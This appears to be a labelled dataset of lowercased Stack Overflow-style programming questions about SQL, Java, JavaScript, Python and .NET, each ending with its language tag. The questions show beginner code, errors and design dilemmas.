elegant syntax for multi-column  cascading  constraint in sql   i am constructing a query that will naturally return a result that has values for several columns  as well as some integer-valued grouping columns (indicating whether a particular value column was subtotalled but that s not in itself relevant to my question).  i want to put a constraint on this query s grouping columns  that only accepts rows where grouping column <em>n</em> is non-zero if all the grouping columns 1 - (<em>n</em>-1) are also non-zero.    it seems like there ought to be a nice way to express this in sql  but all i can come up with so far is the rather cumbersome   <pre><code>where ((grp1 = 0 and grp2 = 0 and grp3 = 0 and ... and grpn = 0)     or (grp1 = 1 and grp2 = 0 and grp3 = 0 and ... and grpn = 0)     or (grp1 = 1 and grp2 = 1 and grp3 = 0 and ... and grpn = 0)     ...     or (grp1 = 1 and grp2 = 1 and grp3 = 1 and ... and grpn = 1) </code></pre>   which is harder to understand the concept from if you re reading it  looks like it would be harder for a sql engine to come up with a decent optimisation  and will generally just clog up logs as well  burying the important bits of the sql in noise.    since this concept seems not too unusual  i m hoping there is a better way to express it that will generally be more concise and hopefully will be more performant on the server itself (assuming my naive version isn t going to be that efficient).,sql

zuul locked doors  ex. 6.44: add locked exits to your game. the player needs to find (or otherwise obtain) a key to unlock the exit and enter a room. (you don t need to add a new class for doors or exits to your game). make this as general as possible - in any room  any exit could potentially be locked.    i have no idea how to do this. one idea was to make a hashmap with direction as keys and boolean (true/false) as values. any suggestions    <pre><code>*  this class is the main class of the  world of zuul  application.   *   world of zuul  is a very simple  text based adventure game.  users   *  can walk around some scenery. that s all. it should really be extended   *  to make it more interesting!  *   *  to play this game  create an instance of this class and call the  play   *  method.  *   *  this main class creates and initialises all the others: it creates all  *  rooms  creates the parser and starts the game.  it also evaluates and  *  executes the commands that the parser returns.  *   * @author  michael kölling and david j. barnes  * @version 2011.08.08  */  public class game  {     private parser parser;

insertion into hashmap changes values in other stored hashmaps  ok  i m stumped by this one i have no idea what s causing this problem.  the problem i am having occurs in a class that when given a text file  will find the number of instances of one letter coming after another.  so i have a hashmapcharacter  hashmap that stores all of this.  the keys of the hash are all the characters contained in the text  and each of these characters corresponds to an inner hash containing the number of cases of a character(inner hash key) after the outerhash key.  the inner hash with key  a  would contain the number of times  b  comes after  a   the number of times  c  comes after  a   the number of times  z  comes after  a   so on and so forth for all the characters that come after  a .  muteableint just holds an int value  and allows it to be incremented by method.    the error occurs when i compute the total of all the counts contained in each inner hash.  i find the total  and then i insert it under the key  ~ .  the total is correct when i insert it  but when i pull out the total later  i find that for every inner hash the total takes on the value of the last total i entered.   <pre><code>currhash.put( ~   total); </code></pre>   so  when analyzing war and peace the last total entered is that of  x   which has a total count of 3987. when i pull out the total instance count of  h   or any other character  it is also 3987.  hopefully this makes sense  here is the offending code.     <pre><code>public class counttransitions {  hashmap&lt;character  hashmap&lt;character  muteableint&gt;&gt; counts;  public void calctotal() { iterator&lt;character&gt; iterator = counts.keyset().iterator();         hashmap&lt;character  muteableint&gt; currhash;         char curr  next;         muteableint total = new muteableint(0);         muteableint count = new muteableint(0);          while (iterator.hasnext()) {             curr = iterator.next();             currhash = counts.get(curr);             total.set(0);             iterator&lt;character&gt; innerit = currhash.keyset().iterator();             while (innerit.hasnext()) {                 next = innerit.next();                 count = currhash.get(next);                 total.add(count);             }//end while             system.out.println( total:   + total);             currhash.put( ~   total);         }//end while } }//end class </code></pre>,java

odd error in my java program  i have a java program that is designed to take an input of customers  then run a loop for each. then the user has 3 choices to input: clowns  safari sam  or music caravan. i just don t understand what is wrong with my <code>if</code> statements. you see  if a user enters  clowns   the corresponding <code>if</code> statement works fine and the <code>if</code> statement is executed. however  if a user inputs  safari sam  or  music caravan   the <code>if</code> statements do not execute.     my question is: if the first <code>if</code> statement is executed  then why are the other 2 being skipped (not executing when conditions are met)      code:   <pre><code>    import java.util.scanner;        public class funrentals {         public static void main(string[] args) {             scanner new_scan = new scanner(system.in);               system.out.println( enter the amount of customers:  );             int num_customers = new_scan.nextint();              for(int i = 1; i&lt;=num_customers; i++){                 system.out.println( please enter the service used (\ clowns\   \ safari sam\   or \ music caravan\ ) for customer # +i);                 string service_type = new_scan.next();                 string service_type_real = service_type.tolowercase();                  if(service_type_real.equals( clowns )){                      system.out.println( please enter the amount of additonal hours );                        double additional_hours = new_scan.nextdouble();                     system.out.println( the total bill for customer #  +i +  is  + clowns(additional_hours));                 }                  else if(service_type_real.equals( safari sam )){                     system.out.println( please enter the amount of additonal hours );                        double additional_hours = new_scan.nextdouble();                     system.out.println( the total bill for customer #  +i +  is  + safari_sam(additional_hours));                 }                  else if(service_type_real.equals( music caravan )){                     system.out.println( please enter the amount of additonal hours );                        double additional_hours = new_scan.nextdouble();                     system.out.println( the total bill for customer #  +i +  is  + music_caravan(additional_hours));                 }              }          }          public static double clowns(double a){             double additional_cost = a*35;             double total_cost = additional_cost + 45;             return total_cost;         }          public static double safari_sam(double a){             double additional_cost = a*45;             double total_cost = additional_cost + 55;             return total_cost;         }         public static double music_caravan(double a){             double additional_cost = a*30;             double total_cost = additional_cost + 40;             return total_cost;         }     } </code></pre>,java

standard way to  log  user s choice on a web page  i have a web page with a tiny space for users to submit some comments.  just one line of text and a button.  if they use it  after pressing the button i have a bit of javascript which disables the button and thanks them.     the next bit is how to send their comment to the server.     the way i have done it is the following:     in the javascript which handles the  submit  i create a new javascript like this:   <pre><code>var script = document.createelement( script ); script.src =  usercomment.js  +commentvalue; document.body.appendchild(script);  </code></pre>   i don t have any usercomment.js script so the call fails silently. however the advantage is that i get a call to the server which is logged and then i can read all of the comments.    i am happy with this solution but i was wondering if there is a better way to achieve the same thing. somehow it seems quite convoluted and a bit of hack.    so my question is what s the standard way to record something as simple as an action from the browser to the server       p.s. i am not allowed to modify the server side. so i can only rely on its logs to retrieve this type of information.    p.s.  please don t suggest an event in google analytics that would be breaching their legals.,javascript

consolidating procedural code to an associative array object  i have 5 functions that check user input against regular expressions...these regular expressions have been abstracted out and put here as suggested in <a href= https://stackoverflow.com/posts/8042289/edit >previous post</a>.    now i want to abstract out the functionality and put the code into an associative array per the previous post as well..however their seemed to be some contention as to whether this is best practice  is this o.k to do     is it good practice to put these functions into an associative array of functions   the previous post doing this is not up..as i m guessing they decided against it.    but basically how to do you group similar methods together properly.     <pre><code>edit 1: // consolidated regular expressions  var patterns = {      name: /^[a-za-z-\s]{1 20}$/     email: /^[a-za-z0-9._-]+@[a-za-z0-9.-]+\.[a-za-z]{1 4}$/    pass: /.{6 40}/    url:  /^[-\w&amp;:\/\.=\  #+]{1 }$/    aml:  /&lt;(.+)_([a-z]){1}&gt;$/ };   // checks full name which allows characters and dashes  function check_name(text id res)    {   for(var d=0;d&lt;=0;d++)     {     if(!patterns[ name ].exec(text.value))       {       o2(id res);       return 0;       }     }     return 1;   }  // checks for valid email form  function check_email(text id res)   {   if(!patterns[ email ].exec(text.value))     {     o2(id res);     return 0;     }   return 1;   }  // checks for password length  function check_pass(text id res)   {   if(!patterns[ pass ];.exec(text.value))     {     o2(id res);     return 0;     }   return 1;   }  // checks for valid url form  function check_url(text id res)   {   if(!patterns[ url ].exec(text.value))     {     o2(id res);     return 0;     }   return 1;   }  // checks for aml form  function check_aml(text)   {     if(a=patterns[ aml ].exec(text))     {     if(a[2]== p )       {       return 0;       }     else if (a[2]== f )       {       return 1;       }     }   else     {     return 2;     }   } </code></pre>,javascript
how to add progressbar in python  i m trying to add progressbar to my install script. i tried to use the module progressbar but it depends on range and i don t have this number  also every file that i want to install takes a different time. i have a list of the files that i want to install and i want to monitor it by progressbar. this is the process line:   <pre><code>p2 = subprocess.popen([ dpkg    --force-all    -i    -r   pwd.strip() +  /archives ]  stdout=out  stderr=err) </code></pre>   i thought to work with the output file  but it grows dynamically and i didn t succeed monitor it. an example for the out file:    in the beginning of the file  there is line of  unpacking  and line of  preparing  for each package:   <pre><code>unpacking openvswitch-switch (2.0.2-0ubuntu0.14.04.2) over (2.0.2-0ubuntu0.14.04.2) ... preparing to unpack .../libllvm3.6_3.6-2ubuntu1_amd64.deb ... unpacking libllvm3.6:amd64 (1:3.6-2ubuntu1) over (1:3.6-2ubuntu1) ... preparing to unpack .../kpartx_0.4.9-3ubuntu7.4_amd64.deb ... unpacking kpartx (0.4.9-3ubuntu7.4) over (0.4.9-3ubuntu7.4) ... . . . </code></pre>   and after that there are lines of  setting up  and sometimes starting the process of the package  like this:   <pre><code>setting up openvswitch-switch (2.0.2-0ubuntu0.14.04.2) ... openvswitch-switch stop/waiting openvswitch-switch start/running setting up libllvm3.6:amd64 (1:3.6-2ubuntu1) ... setting up libxen-4.4 (4.4.2-0ubuntu0.14.04.1) ... setting up sg3-utils (1.36-1ubuntu1) ... . . . </code></pre>   i have 294 files and the numbers of lines that include  unpacking  294   preparing  294 and  setting up  293 and the total number of lines is 915.    anyone have an idea how to do this,python

count the letters of the words within a string  so i am new to javascript - can t seem to find a solution to this simple challenge.     if i am to parse the following into <code>str =  apple ban </code>    it must return the following in an <code>array = [ apple 5    ban 3 ]</code>    basically - count recognise the words  count the amount of letters in each word  split the string whenever a white space comes up and push this into an array with each word separated and the length of each word next to it.     this is my workings so far - why off base.    <pre><code>function addlength(str){    var array = [];    array.push(str.split(/\s+/).length);    return array; } </code></pre>   i have looked through past questions on sof and tried to make my own conclusions / solution. doesn t seem to be the case this time.,javascript

python program skips intended defined function  runs conditionals  not global  why does it skip running through the function   why does it skip through the defined function without running it     the goal is to call the last if and else conditionals only after everything_but_the_end() has run  however the program just skips them. my code was running fine before i made the function (so that i could call it back to replay)  but now it is not running as intended.    <pre><code>import random  rand_num = random.randint(1  10)  guesses_total = 5  guesses_so_far = 0   def everything_but_the_end():     while guesses_so_far &lt; 5:         print( hi  i m thinking of a number  1 - 10. )         guess = int(input( guess what number i am thinking of:  ))         if guess == rand_num:             guesses_so_far = guesses_so_far + 1             break         elif guess &lt; rand_num:             guesses_so_far = guesses_so_far + 1             print( too low \n--- attempt {} .format(guesses_so_far))         elif guess &gt; rand_num:             guesses_so_far = guesses_so_far + 1             print( too high \n--- attempt {} .format(guesses_so_far))   if guesses_so_far &gt; 4:     play_again_lost = input( sorry  you lost. play again  y or n:  )     if play_again .upper() ==  y :         everything_but_the_end()     else:         print( okay  goodbye! )         quit() else:     play_again = input( congrats! you won! want to play again  y or n:  )     if play_again .upper() ==  y :         everything_but_the_end()     else:         print( okay  goodbye! )         quit() </code></pre>   i thought to solve it by just putting everything_but_the_end() after i defined it  but it gives me two errors  that    <pre><code>traceback (most recent call last):   file  /users/danielternyak/google drive/pythonprograms3.4/randnum.py   line 24  in &lt;module&gt;     everything_but_the_end()   file  /users/danielternyak/google drive/pythonprograms3.4/randnum.py   line 11  in everything_but_the_end     while guesses_so_far &lt; 5: unboundlocalerror: local variable  guesses_so_far  referenced before assignment </code></pre>   i am unsure why i am receiving this error  as i have already defined guesses_so_far at the very top of the page.,python

what does the  =>  operator do in javascript  what does the  =>  operator do in javascript  this is probably a very basic question  but it is ungoogle-able. does this operator have a name (to help me find it in references)  it seems to be some kind of remapping function. an example of where i ve found it:   <pre><code>let maxlen = math.max.apply(null  arrays.map(v =&gt; v.length))  out = []; </code></pre>   for finding the longest array held in arrays.,javascript
why have left join at all(why not just have outer join with condition in where clause)  what is the use of a left join(or for that matter maybe even inner join) if one can simply write a full outer join like so   <pre><code>playorm=# select * from trade as a full outer join account as b on b.id=a.accoun tid where a.id = a.id; </code></pre>   this ends up returning all the same results an left inner join would return.    or if you want an inner join  you can do this   <pre><code>playorm=# select * from trade as a full outer join account as b on b.id=a.accoun tid where a.id = a.id and b.id = b.id; </code></pre>   this ends up returning all the same results an inner join would return.    i just thought this was kind of interesting is all i guess.  i originally mistaking thought a left outer join would return nulls + what the conditions matched but found out the conditions have to match which is kind of weird as in this inner join eliminates records that match(probably because join is done before expression matching so the a.accountid is null is a useless part of the where clause...   <pre><code>select * from trade as a inner join account as b on b.id=a.accountid here (b.isactive=false or a.accountid is null) and a.number &lt; 15; </code></pre>   later  dean,sql

why couldn t i insert the same element into an array in javascript   i have a array of objects. but when i insert the object the i previously added  it will override my previous object. how can i solve it     i have on object called player. in player  i have two array : one called onhandweapon  one called onfieldweapon. they are array of weapon object.   <pre><code>function player(lp){         this.lp = lp;         this.onfieldweapon = new array();         this.onhandweapon = new array();      }   function weapon(id  heart  bullet  src){             this.id = id;             this.heart = heart;             this.bullet = bullet;             this.src = src;             this.location;             this.name;             this.discription;             this.bufferbullet = bullet;     } </code></pre>   i have set three dummy object in onhandweapon array. then i want to randomly pick up one of them and put it into onfieldweapon and assign a random location to it.    <pre><code> function aicreateweapon(){         var b = math.floor(math.random()*ai.onhandweapon.length);         $( #console ).append(    + b +    );         var ip = 100;          while($( # +ip).attr( class ) !=  enemyfield ){             ip = math.floor(math.random()*48);         }          encurrentweapon = ai.onhandweapon[b];          var source = encurrentweapon.src;          var oimg = document.createelement( img );         oimg.setattribute( src   source);         oimg.setattribute( height    60px );         oimg.setattribute( width    60px );         $( # +ip).append(oimg).show( explode   slow );          encurrentweapon.location = ip;           ai.onfieldweapon.push( encurrentweapon);          $( #console ).append(    + ai.onfieldweapon[0].location +    ); } </code></pre>   aicreateweapon is a function bind to a button. when i click it  the ai.onfieldweapon[0].location is a fixed location until it changes. i have check that every time when the object which is same as the first element  is added to the onfieldweapon array  it will override the first element s data.,javascript
what is the reason not to use select *   i ve seen a number of people claim that you should specifically name each column you want in your select query.    assuming i m going to use all of the columns anyway  why would i not use <code>select *</code>     even considering the question *<a href= https://stackoverflow.com/questions/128412/sql-query-question-select-from-view-or-select-col1col2from-view >sql query - select * from view or select col1  col2  … coln from view</a>*  i don t think this is an exact duplicate as i m approaching the issue from a slightly different perspective.      one of our principles is to not optimize before it s time.  with that in mind  it seems like using <code>select *</code> should be the <strong>preferred</strong> method until it is proven to be a resource issue or the schema is pretty much set in stone.  which  as we know  won t occur until development is completely done.    that said  is there an overriding issue to not use <code>select *</code>,sql

sql getting count in a date range  i m looking for input on getting a count of records that were  active  in a certain date range.   <pre><code>create table member {     id int identity      name  varchar      active  bit } </code></pre>   the scenario is one where  members  number fluctuate over time. so i could have linear growth where i have 10 members at the beginning of the month and 20 at the end. currently we go off the number of currently active (as marked by an  active  flag in the db) at the time of report. - this is hardly accurate and worse  6 months from now  my  members  figure may be substantially different than now. and since i m doing averages per user  if i run a report now  and 6 months from now - the figures will probably be different.    i don t think a simple  dateactive  and  dateinactive  will do the trick... due to members coming and going and coming back etc. so:   <pre><code>joe may be active 12-1 and deactivated 12-8 and activated 12-20  so joe counts as being a  member  for 8 days and then 11 days for a total of 19 days </code></pre>   but the revolving door status of members means keeping a separate table (presumably) of userid  status  date    <pre><code>create table memberstatus {     member_id int      status bit   -- 0 for in-active  1 for active     date date } (adding this table would make the  active  field in members obsolete). </code></pre>   in order to get a  good  average members per month (or date range) - it seems i d need to get a daily average  and do an average of averages over  x  days. or is there some way in sql to do this already.     this extra  status  table would allow an accurate count going back in time. so in a case where you have a revenue or cost figure  that doesn t change or is not aggregate  it s fixed  that when you want cost/members for last june  you certainly don t want to use your current members count  you want last junes.    is this how it s done  i know it s one way  but it the  better  way...    @gordon - i got ya  but i guess i was looking at records like this:   <pre><code>members     1 joe     2 tom     3 sue  memberstatus     1 1  12-01-2014      1 0  12-08-2014      1 1  12-20-2014  </code></pre>   in this way i only need the last record for a user to get their current status  but i can track back and  know  their status on any give day.    if i m understanding your method it might look like this   <pre><code>create table memberstatus {     member_id int      active_date      inactive_date } </code></pre>   so on the 1-7th the record would look like this   <pre><code>1  12-01-2014  null </code></pre>   and on the 8th it would change to    1  12-01-2014   12-08-2014     the on the 20th   <pre><code>1  12-01-2014   12-08-2014  1  12-20-2014  null </code></pre>   although i can get the same data out  it seems more difficult without any benefit - am i missing something,sql
how can i implement a cancel-button for a batch/queue routine   i have a vb.net 2.0 program  that has a batch/queue routine to execute tasks that take a long while. one of the tasks is  upload to ftp  of large files. the queue is started by the user clicking the  start  button  and then a for-loop just runs over each batch item  and does whatever it needs.    now i want to implement a  cancel queue execution  button. the button should be clickable (the gui mustn t be blocked by the queue being executed)  and the button should stop the current queue action (i don t care about rollback of previously executed tasks).    i guess i need separate threads and some kind of notification scheme  but at what point should i check if the notification is sent  in the for-loop of the queue  but then the user would have to wait for the full upload of the file before the break  which is not what he wants. in the  file upload  method  that s putting too much code in one method  i feel intuitively.    i also need to do some cleanup of the current batch item s actions (like delete the partially uploaded file)  so that has to be factored in somewhere too.    any suggestions in high-level code or with examples  thanks in advance!,.net

stuck on java programming homework assignment  i am working on a problem for homework in a java programming course  and i am stuck. i will tell you upfront that i am by no means an expert  and don t know much about java or programming in general.    the issue that i am having is acutally not with a problem for my homework  but with an example from the book that i cannot seem to get to work. the section of the book is titled   <blockquote>    writing an application that uses the <code>event</code> class  </blockquote>   the book has the following example in this section that it instructs the student to copy and try in their ide to see how the concept of an event class works:   <pre><code>import java.util.scanner;  public class createeventobject {      public static void main(string[] args)     {      int eventtype;     string chosenmanager =   ;     double chosenrate = 0;     event scheduledevent = new event();     final int private_code = 1;     final int corporate_code = 2;     final int nonprofit_code = 3;     final string private_manager =  dustin britt ;     final string corp_manager =  carmen lindsey ;     final string nonprofit_manager =  robin armenetti ;     final double private_rate = 47.99;     final double corp_rate = 75.99;     final double nonprofit_rate = 40.99;     boolean choiceisgood = true;      scanner input = new scanner(system.in);     system.out.println( what type of event are you scheduling  );     system.out.print( enter   + private_code +   for private    + corporate_code +   for corporate  or   + nonprofit_code +   for nonprofit...  );     eventtype = input.nextint();      if(eventtype == private_code)     {         chosenmanager = private_manager;         chosenrate = private_rate;     }     else         if(eventtype == corporate_code)         {             chosenmanager = corp_manager;             chosenrate = corp_rate;         }         else             if(eventtype == nonprofit_code)             {                 chosenmanager = nonprofit_manager;                 chosenrate = nonprofit_rate;             }             else                 choiceisgood = false;      if(choiceisgood)     {         scheduledevent.settype(eventtype);         scheduledevent.setmanager(chosenmanager);         scheduledevent.setrate(chosenrate);     }     else         system.out.println( you entered   + eventtype +   which is invalid. );      system.out.println( scheduled event: );     system.out.println( type:   + scheduledevent.gettype() +   manager:   + scheduledevent.getmanager() +   rate:   + scheduledevent.getrate() +   per hour );     }  } </code></pre>   when i try to compile the code above  i get the following error from the ide:   <pre><code>createeventobject.java:12: error: cannot find symbol     event scheduledevent = new event();     ^   symbol:   class event   location: class createeventobject createeventobject.java:12: error: cannot find symbol </code></pre>   it says the class event is the issue  but according to the book  that s a valid class...    i am using jgrasp on windows 7 professional 64bit and jdk 1.70.    i think it is weird that an example from the book doesn t compile correctly  but it isn t. i am probably missing something really easy  but i can t see anythign that is wrong.    any help or direction would be appreciated. thanks in advance for the help.,java

should `system.io.path` be concrete   members of the <code>path</code> class like <code>path.combine</code> are indispensable. they lead to great  clean  correct code. unfortunately  if you use it for something like managing header paths in a c++ preprocessor  you ll quickly realize that it s showing up more than expected in the profiler. why    <blockquote>    exceptions: argumentexception: <em>path1</em> or <em>path2</em> contain one or more of the invalid characters defined in  <code>getinvalidpathchars</code>.  </blockquote>   even without the check  the combine command is o(n) (since it has to copy the string contents). however  that is much less expensive than checking for the existence of any of <code>getinvalidpathchars</code>  ~40 members.    i believe that the <code>path</code> class should be an immutable type that contains a string known to not contain any invalid characters. static members should be provided for operating on <code>string</code> (as exists now) and an identical set added for working on <code>path</code> objects. making this change in the .net framework:   <ul> <li>is not a breaking change (changing a static class to a sealed concrete type is non-breaking)</li> <li>significantly improves performance of several best-practices operations</li> </ul>   opinions,.net

how to use the least amount of memory to store a string in a hashset  i have a large amount of strings that need to be stored in a very compact fashion. currently i am storing the strings (32 characters a-f/0-9) in <code>hashset&lt;byte[]&gt;</code>. i am simply calling <code>.getbytes()</code> to get this.     my question is  is there a better way to store this data in a hashset,java
function call of an outer function within another function stops function from executing  i have these two functions declared in the same <code>.js</code> file. the first <code>httpget</code> function is supposed to make requests to a restful api using the <code>get</code> method. this function is one that i have used before and i know that it works. the second function titled <code>basicaccess</code> receives input from an html form.     everything up until the <code>var httpreq = httpget( 127.0.0.1:5000 )</code> function call in the <code>basicaccess</code> function executes. as soon as it hits this line the script stops evaluating further lines of code.    i don t want to have to clutter the <code>basicaccess</code> function with the stuff from the <code>httpget</code> function. ideally i would also like the regex matching to be in it s own function as well  but when i tried that it also stops the script from executing lines once i try to reference a function outside.     please let me know if you have any insight to how i am approaching this wrong. fairly knew to javascript and didn t even know how to adequately search for this in the forum.   <pre><code>function httpget(theurl) {     var xmlhttp = new xmlhttprequest();     xmlhttp.open(  get   theurl  false ); // false for synchronous request     xmlhttp.send( null );     return xmlhttp.responsetext; }  function basicaccess (form) {     start =form.startdate.value;     end =form.enddate.value;     ethosboundary =  2015-12-01 ;      arg =  false ;     re = /^\d{4}-\d{1 2}-\d{1 2}$/;      if(form.startdate.value !=    &amp;&amp; !form.startdate.value.match(re)) {         alert( invalid date format:   + form.startdate.value);         form.startdate.focus();         return false;      }     var httpreq = httpget( 127.0.0.1:5000 );      if (start &gt; end){         alert ( error:   +  the start date:   + start +    occurs after the end date:   + end);         return;}     if ((start &lt; ethosboundary) &amp;&amp; (end &lt; ethosboundary))         arg =  both less ;     if ((start &gt; ethosboundary) &amp;&amp; (end &gt;  ethosboundary))          arg =  both greater ;     if ((start &lt; ethosboundary) &amp;&amp; (end &gt; ethosboundary))          arg =  start less end greater ;      alert ( you typed:   + arg) } </code></pre>,javascript

.net timespan object: how do i get the start and end datetime   consider this:   <pre><code>dim startdate as datetime = #06/12/2010 6:32pm# dim enddate as datetime = #06/13/2010 10:47pm# dim elapsedspan as timespan = startdate - enddate </code></pre>   does the timespan object retain the original start and end datetimes that make up the span period  it doesn t appear to and only seems to store the amount of time elapsed not the actual end points.     if i want this too  should i create my own class  i suppose or is there a better object,.net

in javascript  why does the constructor property point to the base-most constructor in the prototype chain   i m curious about this design of javascript  and perhaps any reasons for this architecture or design patterns that can be employed to take advantage of this.    the <code>constructor</code> property of an object is always a reference to the function that created that object  correct     however  take this code:   <pre><code>  function base()   {      this.sayhi = function ()      {         window.alert( hi );      };   }    function subclass()   {      this.saybye = function ()      {         window.alert( bye );      };   }    subclass.prototype = new base();    var s = new subclass();   s.sayhi();   s.saybye();   window.alert(s.constructor); </code></pre>   the last line will echo the constructor for <code>base</code>  even though we know <code>subclass</code> was called to create the object (otherwise <code>saybye</code> would not work).    one potential work-around would be to simply do:   <pre><code>subclass.prototype.constructor = subclass; </code></pre>   perhaps a more concise way of asking my question is why is <code>s.constructor</code> equal to <code>subclass.prototype.constructor</code> and not <code>subclass.constructor</code>  since <code>s</code> is an instanceof subclass.  thanks!,javascript

.net working directory  paths  and imported html  i ve received some html with javascript from an external company that needs integrating with our .net project.    i have taken the approach of copying the html directly into a user control as the html changes infrequently. this caused an issue with the scripts as they refer to paths such as img/myimage.jpg and the working directory has changed as the page is part of our sitecore system. i have updated the images to use relative paths from the root directory e.g. /resources/img/myimage.jpg and this gets it mostly working.    this should work functionally but it doesn t function as expected and i cant identify the issue (no 404 issues).    so im thinking about alternatives: how can i import the html with the  working directory of the html maintained so the scripts continuing to work     thanks,.net

orm suggestions –with sprocs  ok  i have a question that i know is very opinionated (based on all the posts i have read)  but i need help. long story short  i have been using the following model for data access for past few  years.    database->sprocs->xsd(typed dataset  drag drop sproc  in.net)-> in dal project make functions to call created methods made by xsd  load all the data then map to projects  business objects.    the pros of this:    1) easy drop drag to create sql calls    2) sprocs are almost a most due to other constraints and easy to add    3) project uses own business objects that fit the solution and  not the database  i just map them in c#    4) code mapping  easy to refactor    5) who doesn’t like everything to be typed and intellisensed    cons: 1) slow to build    2)slow to pull data (table adapter and datasets have bad performance compared to a datareader)    3) buggy when it comes to null vales. and boy can this krap be buggy and this wastes a lot of time.    so that’s what i’ve been doing and not being an idiot  i realized there has to be better ways. so i have spent the last week looking at nhiberabte  linq to sql  entity framework  or going back to doing it all with code with datareaders and untyped.    <strong>so  the question is what is a good database (sprocs likely to objects) mapper .</strong>    my thoughts on the 3 i looked at:    1)linq to sql – well its only sql and microsoft pretty much has said it’s a dead technology  so seems pointless.    2) entity framework – i probably need more exposure to this one  but it seems like  mapping this stuff to my own objects would put me back to where i was.    3) nhibernate – looked promising  but dam i hate writing xml files and my current projects have like 30 to 50 business objects. also  i have to use sprocs in various areas.    anyone’s suggestions or a really good link to a tutorial on a good orm would be greatly appreciated. sorry this question is so long. thanks  joe,.net
stop a python for loop when conditions are met at different times  the following is a simple code i wrote in python to scrape specific information from numerically ascending urls. it works great  and i can see the results in python idle.    <pre><code>import requests from urllib import request  response  error  parse from urllib.request import urlopen from bs4 import beautifulsoup  for i in range(35  345  1):     url =  https://www.example.com/id=  + str(i)     html = urlopen(url)     soup = beautifulsoup(html   html.parser )     information1=soup.find(text= sam )     information2=soup.find(text= john )     print(information1 information2 i) </code></pre>   so the results look like this:   <pre><code>none none 35 none none 36 none sam 37 john none 38 none none 39 .... none none 345 </code></pre>   now this is great and is what i need  but i would like to improve my code by having the execution stop at  john none 38  when everything i need is found. so there won t be the unnecessary additional 300 plus lines.     now there are two things you should know. first  information1 and information2 will never be in the same webpage. they will always be on separate urls. second  information1 appeared first before information2 in the above code  but the reverse is also possible if i changed the string to something else i m looking for.     so the solution needs to incorporate the fact that information1 and information2 will appear in the results at different rows  and that information1 could appear first or second and vice versa.    i m really struggling to form  if  code with the above mentioned conditions. i d appreciate any help. thank you.,python

can .net assembly work on mac linux  <b>pre .net :</b> before .net language compiler (for example vb compiler) don t generates il (intermediate language) it only generates native code. so their was no portability in pre .net applications. they are failed to run on operating systems other than windows.        <b>with .net :</b> .net applications generates assembly with intermediate language. which later convert by clr (jit) into native code. because of intermediate language there is portability.    but     i googled some questions still in my mind  is dll run on mac/linux  is exe run on mac/linux  is microsoft office run on mac/linux     believe me there are no answers which says clearly yes or no. i got the answers with : you have to <b>install something</b>... you can <b>make it run</b>...    is microsoft provides <b>operating system suitable</b> .net framework or clr. really confused!!!    please clear me if i am wrong.,.net

sql not exist subquery  i have a situation when i have a number of unique site/primary records with child records  and subsequent grandchild records. i am looking to modify my sql query so it will populate the unique primary records based on whether or not grandchild records exist  but then further filter down those primary records based on the child record columns.    e.g.    <pre class= lang-sql prettyprint-override ><code>select primarytable.sitekey from primarytable where not exists (     select*     from primarytable  childtable  grandchildtable     where primarytable.sitekey = childtable.sitekey     and childtable.key = grandchildtable.parentkey) </code></pre>   this works  whereby the list of sites/primary records that have child records  which do not have grandchild records populate.    if i want to further filter on the primary table  to the end of the query i could add <code>and primarytable.column1 =  mydesiredvalue </code> and it works fine. however  i want to filter it by <code>childtable.column !=  mydesiredvalue </code>.    when i do this  i get an error that the parameter is not bound  and the <code>childtable</code> is not listed at the beginning of the query.     i need the primary keys to populate and i cannot use joins using the interface/software i am working with  unfortunately. hoping there is a way to modify the query above to make it work.,sql

.net solution or ide problem  i have a weird situation with .net. i have 3 different projects  - 1st is main server project.  - 2nd is the communication class which uses sockets to communicate with server.  - 3rd is the client application. everything works fine in windows 7 but when it comes to win xp it behaves abnormaly.    my client application sends sometime messages to server thru communcation project and doesnt recevies at all but server do send the messages. but if i make a new project and copy all the code and files only for client application then it works 100% fine from ide. that means from ide if i run the newly made client application in debug or release mode it communicates fine. but the moment instead of starting from ide if i start the exe from debug or release folder everythign stops working even from ide that means server sometimes gets the messages and client never receives the messages from server. but if i make a new project it works fine only from ide. but everything works from windows 7 even from ide or from direct exe. any help will be appreciated.,.net

issue with an object of objects  basically i am testing es6 and wanted to try and return an object of objects from an array of objects  each object in the array has an id and a parent  the id will be the name of the property held within the parent. simple enough  here is my code:   <pre><code>//an array of objects  let animals = [{             id:  animal               parent: null }  {             id:  dog               parent:  animal  }  {             id:  cat               parent:  animal  }  {             id:  fish               parent:  animal  }  {             id:  labrador               parent:  dog  }  {             id:  cocker spaniel               parent:  dog  }  {             id:  bass               parent:  fish  }  {             id:  tuna               parent:  fish  }  {             id:  house cat               parent:  cat  }  {             id:  outdoor cat               parent:  cat  }  {             id:  human               parent:  animal  }  {             id:  man               parent:  human  }  {             id:  woman               parent:  human  }];  //a recursive function to build our object of objects tree  let maketreeofcategories = (categories  parent) =&gt; {             let parentnode = {};             categories                         .filter(category =&gt; category.parent === parent)                         .foreach(category =&gt; parentnode[category.id] =                                     maketreeofcategories(categories  category.id));             return parentnode; };  console.log(json.stringify(maketreeoftrees(animals  null)  null  2)); </code></pre>   this code will return:   <pre><code>{      animal : {          dog : {              labrador : {}               cocker spaniel : {}         }           cat : {              house cat : {}               outdoor cat : {}         }           fish : {              bass : {}               tuna : {}         }           human : {              man : {}               woman : {}         }     } } </code></pre>   now  if we run the following:   <pre><code>//call our object and store in a variable  let obj = maketreeofcategories(animals  null);  //loop through the object and alert each child item and its children  for (var key in obj) {             var val = obj[key];             alert( key:   + key +   value:  + val); } </code></pre>   it alerts one time saying  key: animal value: [object object]  but what i don t understand is why  i would expect it to return with  key: animal value: dog  then  key: animal value: cat  and so on.    you know  basically allowing me to loop through each object inside the object of objects and alert its properties and their values.    also  if you could tell me this also  how would i access something like:   <pre><code>{}.animal.dog.labrador  </code></pre>   if i was looking for something specific like if labrador had a property called name for example.    i hope that makes sense  i think i am just confusing myself if anything just now but i hope i made clear what i have tried and what i would like to happen.    cheers  sd,javascript
